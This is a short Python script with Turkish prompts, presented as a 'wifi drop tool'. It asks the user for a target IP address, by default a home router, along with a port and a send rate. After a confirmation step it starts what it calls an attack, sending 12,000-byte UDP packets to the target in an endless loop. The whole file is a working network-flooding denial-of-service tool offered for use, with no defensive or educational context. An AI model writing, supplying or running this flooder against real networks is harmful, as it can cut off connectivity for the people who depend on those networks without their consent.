import socket
import time
import os
import colorama
from colorama import Fore

colorama.init()

os.system('cls')

logo =Fore.LIGHTBLUE_EX + '''
       .     .                   .
,-.    |-    |     ,-.    ,-.    |-       ,-.
,-|    |     |     ,-|    | |    |        `-.
`-^    `'    `'    `-^    ' '    `'       `-'

! wifi drop tool  ! - maded by c4k1r / S P A C E
'''
print(logo)

print(Fore.LIGHTRED_EX + ' ')

hedef_ip = input("Hedef IP adresini girin (genelde 192.168.1.1): ")
hedef_port = int(input("Hedef port numarasını girin (genelde 5005): "))
hiz_mbps = float(input("Gönderim hızını belirleyin (Mbps)(önerilen 100): "))
time.sleep(2)

os.system('cls')
print(Fore.BLUE + ' ')

baslat = input("saldırıyı başlatmak için '1' yazın: ")
if baslat != "1":
    print("saldırı iptal edildi.")
    exit()

print(f"\n🚀 saldırı başlıyor! {hedef_ip}:{hedef_port} adresine {hiz_mbps} Mbps hızında paket gönderiliyor...\n")
time.sleep(3)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


byte_per_sec = (hiz_mbps * 1_000_000) / 8 
paket_boyutu = 12000  
gecikme = paket_boyutu / byte_per_sec  

print(Fore.BLUE + ' ')

sayac = 0
while True:
    sock.sendto(b"A" * paket_boyutu, (hedef_ip, hedef_port))
    sayac += 1
    print(f"saldırı yapıldı ({sayac}). Hız: {hiz_mbps} Mbps")
    time.sleep(gecikme) 
